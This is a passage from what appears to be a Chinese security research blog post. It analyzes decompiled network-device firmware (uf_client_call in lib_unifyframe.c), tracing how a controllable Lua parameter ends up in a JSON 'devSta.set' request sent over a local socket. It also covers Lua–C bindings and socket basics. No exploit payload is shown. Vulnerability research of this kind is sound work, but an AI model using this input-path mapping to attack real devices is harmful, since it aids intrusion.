class="number">433</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v7;</span><br><span class="line">      v12 = <span class="string">&quot;devSta.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v15 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">      v8 = <span class="built_in">calloc</span>(v15, <span class="number">1</span>);</span><br><span class="line">      v9 = <span class="number">463</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">      v10 = v8;</span><br><span class="line">      v11 = v15;</span><br><span class="line">      v12 = <span class="string">&quot;devCap.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v16 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">7</span>;</span><br><span class="line">      v17 = <span class="built_in">calloc</span>(v16, <span class="number">1</span>);</span><br><span class="line">      v8 = v17;</span><br><span class="line">      <span class="keyword">if</span> ( !v17 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">473</span>;</span><br><span class="line">LABEL_20:</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)malloc failed!&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>, v9);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">      &#125;</span><br><span class="line">      v10 = v17;</span><br><span class="line">      v11 = v16;</span><br><span class="line">      v12 = <span class="string">&quot;ufSys.%s&quot;</span>;</span><br><span class="line">LABEL_22:</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">snprintf</span>(v10, v11, v12, v6) &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(v8);</span><br><span class="line">LABEL_24:</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)method snprintf failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v18 = json_object_new_string(v8);</span><br><span class="line">      <span class="built_in">free</span>(v8);</span><br><span class="line">      <span class="keyword">if</span> ( !v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_method failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v4, <span class="string">&quot;method&quot;</span>, v18);</span><br><span class="line">      v19 = json_object_new_object();</span><br><span class="line">      <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_param failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v20 = json_object_new_string(*(_DWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="keyword">if</span> ( !v20 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v19);</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_module failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v19, <span class="string">&quot;module&quot;</span>, v20);</span><br><span class="line">      v21 = *(_DWORD *)(a1 + <span class="number">20</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v21 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      v22 = json_object_new_string(v21);</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">      json_object_object_add(v19, <span class="string">&quot;remoteIp&quot;</span>, v22);</span><br><span class="line">LABEL_34:</span><br><span class="line">      v23 = *(_DWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">      &#123;</span><br><span class="line">        v24 = json_object_new_string(v23);</span><br><span class="line">        <span class="keyword">if</span> ( !v24 )</span><br><span class="line">        &#123;</span><br><span class="line">          json_object_put(v19);</span><br><span class="line">          json_object_put(v4);</span><br><span class="line">          syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_passwd failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v19, <span class="string">&quot;remotePwd&quot;</span>, v24);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">36</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = json_object_new_int();</span><br><span class="line">        <span class="keyword">if</span> ( !v25 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_40:</span><br><span class="line">          json_object_put(v19);</span><br><span class="line">          json_object_put(v4);</span><br><span class="line">          syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_remoteip failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v19, <span class="string">&quot;buf&quot;</span>, v25);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)a1 != <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v26 = *(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">45</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">42</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v28 )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = v19;</span><br><span class="line">            v30 = <span class="string">&quot;execute&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">43</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v27 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v27 )</span><br><span class="line">            json_object_object_add(v19, <span class="string">&quot;force&quot;</span>, v27);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">44</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v28 )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = v19;</span><br><span class="line">            v30 = <span class="string">&quot;configId_not_change&quot;</span>;</span><br><span class="line">LABEL_54:</span><br><span class="line">            json_object_object_add(v29, v30, v28);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v26 = *(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">45</span>);</span><br><span class="line">LABEL_56:</span><br><span class="line">      <span class="keyword">if</span> ( v26 )</span><br><span class="line">      &#123;</span><br><span class="line">        v31 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v31 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;from_url&quot;</span>, v31);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">47</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v32 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v32 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;from_file&quot;</span>, v32);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">48</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v33 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;multi&quot;</span>, v33);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">46</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v34 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v34 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;not_commit&quot;</span>, v34);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">40</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v35 = json_object_new_boolean(*(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">41</span>) ^ <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v35 )</span><br><span class="line">          json_object_object_add(v19, <span class="string">&quot;async&quot;</span>, v35);</span><br><span class="line">      &#125;</span><br><span class="line">      v36 = *(_BYTE **)(a1 + <span class="number">12</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v36 || !*v36 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      v37 = json_object_new_string(v36);</span><br><span class="line">      <span class="keyword">if</span> ( !v37 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_78;</span><br><span class="line">      json_object_object_add(v19, <span class="string">&quot;data&quot;</span>, v37);</span><br><span class="line">LABEL_75:</span><br><span class="line">      v38 = *(_BYTE **)(a1 + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v38 &amp;&amp; *v38 )</span><br><span class="line">      &#123;</span><br><span class="line">        v39 = json_object_new_string(v38);</span><br><span class="line">        <span class="keyword">if</span> ( !v39 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_78:</span><br><span class="line">          json_object_put(v19);</span><br><span class="line">          json_object_put(v4);</span><br><span class="line">          syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_data failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v19, <span class="string">&quot;device&quot;</span>, v39);</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v4, <span class="string">&quot;params&quot;</span>, v19);</span><br><span class="line">      v40 = json_object_to_json_string(v4);</span><br><span class="line">      <span class="keyword">if</span> ( !v40 )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new json_object_to_json_string send buf failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v41 = uf_socket_client_init(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v41 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(v4);</span><br><span class="line">        v42 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">12</span>);</span><br><span class="line">        v43 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">4</span>);</span><br><span class="line">        v44 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">8</span>);</span><br><span class="line">        v45 = *(_DWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v42 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v45 )</span><br><span class="line">          &#123;</span><br><span class="line">            syslog(</span><br><span class="line">              <span class="number">3</span>,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, caller: %s [ctype:%d  %s -m %s %s]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_client_call&quot;</span>,</span><br><span class="line">              <span class="number">651</span>,</span><br><span class="line">              *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">16</span>),</span><br><span class="line">              *(_DWORD *)a1,</span><br><span class="line">              v43,</span><br><span class="line">              v44,</span><br><span class="line">              v42);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          syslog(</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, [ctype:%d  %s -m %s %s]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !v45 )</span><br><span class="line">          &#123;</span><br><span class="line">            syslog(</span><br><span class="line">              <span class="number">3</span>,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, [ctype:%d %s -m %s]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_client_call&quot;</span>,</span><br><span class="line">              <span class="number">662</span>,</span><br><span class="line">              *(_DWORD *)a1,</span><br><span class="line">              v43,</span><br><span class="line">              v44);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          syslog(</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="string">&quot;(%s %s %d)uf_socket_client_init failed, caller: %s [ctype:%d %s -m %s]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;lib_unifyframe.c&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v46 = <span class="built_in">strlen</span>(v40);</span><br><span class="line">      uf_socket_msg_write(v41, v40, v46);</span><br><span class="line">      json_object_put(v4);</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">40</span>) &amp;&amp; *(_BYTE *)(a1 + <span class="number">41</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_socket_close(v41);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v56 = <span class="number">1</span> &lt;&lt; (v41 &amp; <span class="number">0x1F</span>);</span><br><span class="line">      v47 = &amp;v53[<span class="number">4</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)v41 &gt;&gt; <span class="number">5</span>)];</span><br><span class="line">      v48 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v50 = <span class="number">4</span> * v48;</span><br><span class="line">    <span class="keyword">if</span> ( v48 &lt; <span class="number">0x20</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">    *(_DWORD *)v47 |= v56;</span><br><span class="line">    v51 = select(v41 + <span class="number">1</span>, v53, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v51 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_socket_close(v41);</span><br><span class="line">      syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)select timeout[%s]&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v51 &gt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v49 = (_DWORD *)_errno_location();</span><br><span class="line">    <span class="keyword">if</span> ( (*v49 &amp; <span class="number">0xFFFFFFF7</span>) != <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_socket_close(v41);</span><br><span class="line">      strerror(*v49);</span><br><span class="line">      syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)select error %s&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)socket EINTR or ENOMEM [%d]&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>, <span class="number">691</span>, *v49);</span><br><span class="line">    v48 = <span class="number">0</span>;</span><br><span class="line">    v50 = <span class="number">0</span>;</span><br><span class="line">LABEL_98:</span><br><span class="line">    *(_DWORD *)&amp;v53[v50] = <span class="number">0</span>;</span><br><span class="line">    ++v48;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ((*(<span class="type">int</span> *)v47 &gt;&gt; (v41 &amp; <span class="number">0x1F</span>)) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v52 = uf_socket_msg_read(v41, a2);</span><br><span class="line">    uf_socket_close(v41);</span><br><span class="line">    <span class="keyword">if</span> ( v52 &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v52;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)FD_ISSET failed[%s]&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>, <span class="number">710</span>, *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">8</span>));</span><br><span class="line">    uf_socket_close(v41);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然这里有400行，但是或许有个思路便是从可控字段出发分析</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br></pre></td></tr></table></figure><p>首先先大致分析一下每个参数是什么，ctype&#x3D;2，cmd&#x3D;’set’，module&#x3D;”networkId_merge”，param&#x3D;可控字段，只到back后面都是null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(v4) + <span class="number">8</span>;</span><br><span class="line">  v9 = <span class="built_in">calloc</span>(v8, <span class="number">1</span>);</span><br><span class="line">  v10 = <span class="number">433</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  v11 = v9;</span><br><span class="line">  v12 = v8;</span><br><span class="line">  v13 = <span class="string">&quot;devSta.%s&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_22;</span><br></pre></td></tr></table></figure><p>因此v13&#x3D;”devSta.set”，之后goto LABEL_22</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LABEL_22:</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">snprintf</span>(calloc_ptr, len2, method, v7) &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(calloc_ptr_1);</span><br><span class="line">LABEL_24:</span><br><span class="line">        json_object_put(method_1);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)method snprintf failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      devSta_string = json_object_new_string(calloc_ptr_1);</span><br><span class="line">      <span class="built_in">free</span>(calloc_ptr_1);</span><br><span class="line">      <span class="keyword">if</span> ( !devSta_string )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(method_1);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_method failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(method_1, <span class="string">&quot;method&quot;</span>, devSta_string);</span><br></pre></td></tr></table></figure><p>method字段赋为’devSta.set’</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v20 = json_object_new_object();</span><br><span class="line"><span class="keyword">if</span> ( !v20 )</span><br><span class="line">&#123;</span><br><span class="line">  json_object_put(method_1);</span><br><span class="line">  syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_param failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">v21 = json_object_new_string(*(_DWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line"><span class="keyword">if</span> ( !v21 )</span><br><span class="line">&#123;</span><br><span class="line">  json_object_put(v20);</span><br><span class="line">  json_object_put(method_1);</span><br><span class="line">  syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_module failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">json_object_object_add(v20, <span class="string">&quot;module&quot;</span>, v21);</span><br></pre></td></tr></table></figure><p>会发现这个将a1当作地址，然后通过这个来赋值，问题就出现了，上网查了一下加上自己的猜测写下以下的理解</p><blockquote><p>在lua文件中调用一个C库的函数，首先lua它的每一个协程都有自己的栈，称其为软栈，之后举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lua.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lauxlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lualib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 共享库中的函数实现</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_function</span><span class="params">(lua_State *L)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取参数</span></span><br><span class="line">    <span class="type">int</span> arg1 = luaL_checkinteger(L, <span class="number">1</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *arg2 = luaL_checkstring(L, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印参数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arg1: %d, arg2: %s\n&quot;</span>, arg1, arg2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回结果</span></span><br><span class="line">    lua_pushstring(L, <span class="string">&quot;result from C function&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 返回一个结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册函数</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">luaL_Reg</span> <span class="title">mylib</span>[] =</span> &#123;</span><br><span class="line">    &#123;<span class="string">&quot;my_function&quot;</span>, my_function&#125;,</span><br><span class="line">    &#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开库</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">luaopen_mylib</span><span class="params">(lua_State *L)</span> &#123;</span><br><span class="line">    luaL_newlib(L, mylib);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>会发现它传入的参数是一个指针，同时只有一个指针，然后之后会进行注册函数，两个NULL是哨兵，而参数的调用是用了luaL_checkinteger和luaL_checkstring函数，L是一个指向含有所有参数的内容的指针，猜测L是指向软栈，即lua栈上的内容，或者是C会将软栈上的内容copy到C的某块内存里并写下一个指针指向它，只能说形式不一定是正确的，但是效果是一定的</p></blockquote><p>之后的分析就不会特别难，主要是看清if条件满不满足，大部分都是可以不用分析的</p><p>之后便分析出会发送形如<code>&#123;&quot;method&quot;:&quot;devSta.set&quot;, &quot;params&quot;:&#123;&quot;module&quot;:&quot;networkId_merge&quot;, &quot;async&quot;:true, &quot;data&quot;:&quot;xxx&quot;&#125;&#125;</code></p><p>补充一下基础的只是 what is socket？</p><blockquote><p>Socket（套接字）是网络编程中用于描述计算机之间通信的端点。它提供了一种机制，使得应用程序可以通过网络传输数据。Socket 是操作系统提供的一种编程接口，用于网络通信。它可以在同一台计算机上的不同进程之间通信，也可以在不同计算机之间通信。</p><h3 id="Socket-的类型"><a href="#Socket-的类型" class="headerlink" title="Socket 的类型"></a>Socket 的类型</h3><ol><li><strong>流式套接字（Stream Socket，SOCK_STREAM）</strong>：<ul><li>使用 TCP（传输控制协议）进行通信。</li><li>提供可靠的、面向连接的字节流服务。</li><li>适用于需要保证数据传输顺序和完整性的应用，例如 HTTP、FTP 等。</li></ul></li><li><strong>数据报套接字（Datagram 